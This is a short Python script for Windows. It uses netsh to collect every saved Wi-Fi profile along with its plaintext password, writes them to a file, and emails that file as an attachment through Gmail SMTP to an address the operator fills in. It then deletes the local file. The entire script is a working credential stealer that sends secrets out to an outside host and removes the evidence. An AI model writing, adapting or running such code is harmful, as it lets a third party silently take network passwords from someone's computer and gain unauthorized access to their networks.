#!/usr/bin/env python3
senderemail = "?"
senderemailpassowrd = "?"
receiveremail = "?"

import smtplib
import mimetypes
from email.message import EmailMessage
import subprocess
import sys
import os

f = open("codes.txt", "w")
sys.stdout = f

data = (
    subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    .decode("utf-8", errors="backslashreplace")
    .split("\n")
)

profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    try:
        results = (
            subprocess.check_output(
                ["netsh", "wlan", "show", "profile", i, "key=clear"]
            )
            .decode("utf-8", errors="backslashreplace")
            .split("\n")
        )
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

        try:
            print("{:<30}|  {:<}".format(i, results[0]))
        except IndexError:
            print("{:<30}|  {:<}".format(i, ""))
    except subprocess.CalledProcessError:
        print("{:<30}|  {:<}".format(i, "ENCODING ERROR"))
f.close()

message = EmailMessage()
message['From'] = senderemail
message['To'] = receiveremail
message['Subject'] = 'CODES!!!!!!!!'
body = "Here are the codes you send me to retreve"

message.set_content(body)
mime_type, _ = mimetypes.guess_type('codes.txt')
mime_type, mime_subtype = mime_type.split('/')
with open('codes.txt', 'rb') as file:

 message.add_attachment(file.read(),
 maintype=mime_type,
 subtype=mime_subtype,
 filename='codes.txt')



mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
mail_server.set_debuglevel(1)
mail_server.login(senderemail, senderemailpassowrd)
mail_server.send_message(message)
mail_server.quit()

os.remove("codes.txt")
